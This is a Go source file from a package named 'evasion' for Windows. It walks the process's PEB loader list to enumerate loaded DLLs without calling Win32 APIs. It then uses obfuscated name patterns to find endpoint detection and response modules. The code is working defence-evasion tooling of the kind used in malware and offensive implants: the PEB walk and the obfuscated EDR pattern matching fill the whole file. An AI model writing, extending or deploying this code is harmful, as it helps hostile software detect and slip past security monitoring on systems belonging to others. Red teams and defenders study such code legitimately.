//go:build windows

package evasion

import (
	"strings"
	"syscall"
	"unsafe"
)

// Windows PEB/LDR structures for walking loaded modules without calling GetModuleHandle.

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             uint16 // padding
	_             uint16
	Buffer        *uint16
}

type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}

// ldrDataTableEntry mirrors the Windows LDR_DATA_TABLE_ENTRY structure.
type ldrDataTableEntry struct {
	InLoadOrderLinks       listEntry
	InMemoryOrderLinks     listEntry
	InInitializationOrderLinks listEntry
	DllBase                uintptr
	EntryPoint             uintptr
	SizeOfImage            uint32
	_                      uint32
	FullDllName            unicodeString
	BaseDllName            unicodeString
}

type pebLdrData struct {
	Length                          uint32
	Initialized                     uint32
	SsHandle                        uintptr
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry
}

type peb struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	_                        byte
	_                        uintptr
	_                        uintptr
	Ldr                      *pebLdrData
}

// readUnicodeString reads a Windows UNICODE_STRING buffer into a Go string.
func readUnicodeString(us unicodeString) string {
	if us.Buffer == nil || us.Length == 0 {
		return ""
	}
	buf := make([]uint16, us.Length/2)
	for i := range buf {
		buf[i] = *(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(us.Buffer)) + uintptr(i)*2))
	}
	return syscall.UTF16ToString(buf)
}

// ModuleInfo holds info about a loaded module discovered via PEB walk.
type ModuleInfo struct {
	Name    string
	Base    uintptr
	Size    uint32
}

// WalkModules enumerates all loaded modules via the PEB InLoadOrder list.
// Returns a slice of ModuleInfo without calling any Win32 API.
func WalkModules() []ModuleInfo {
	// Get PEB via TEB gs:[0x60] on AMD64
	var pebAddr uintptr
	pebAddr = getPEBAddress() // implemented in peb_amd64.s

	if pebAddr == 0 {
		return nil
	}

	p := (*peb)(unsafe.Pointer(pebAddr))
	if p.Ldr == nil {
		return nil
	}

	var modules []ModuleInfo
	head := &p.Ldr.InLoadOrderModuleList
	curr := head.Flink

	for curr != head {
		entry := (*ldrDataTableEntry)(unsafe.Pointer(curr))
		name := readUnicodeString(entry.BaseDllName)
		if name != "" {
			modules = append(modules, ModuleInfo{
				Name: name,
				Base: entry.DllBase,
				Size: entry.SizeOfImage,
			})
		}
		curr = curr.Flink
	}

	return modules
}

// FindModule returns the ModuleInfo for a DLL by lowercase name substring.
func FindModule(nameLower string) *ModuleInfo {
	for _, m := range WalkModules() {
		if strings.Contains(strings.ToLower(m.Name), nameLower) {
			return &ModuleInfo{Name: m.Name, Base: m.Base, Size: m.Size}
		}
	}
	return nil
}

// FindEDRModules returns all loaded modules that match known EDR patterns.
func FindEDRModules() []ModuleInfo {
	all := WalkModules()
	var found []ModuleInfo
	patterns := make([]string, len(SEDRPatterns))
	for i, p := range SEDRPatterns {
		patterns[i] = strings.ToLower(Obf(p))
	}
	for _, m := range all {
		nameLower := strings.ToLower(m.Name)
		for _, pat := range patterns {
			if strings.Contains(nameLower, pat) {
				found = append(found, m)
				break
			}
		}
	}
	return found
}
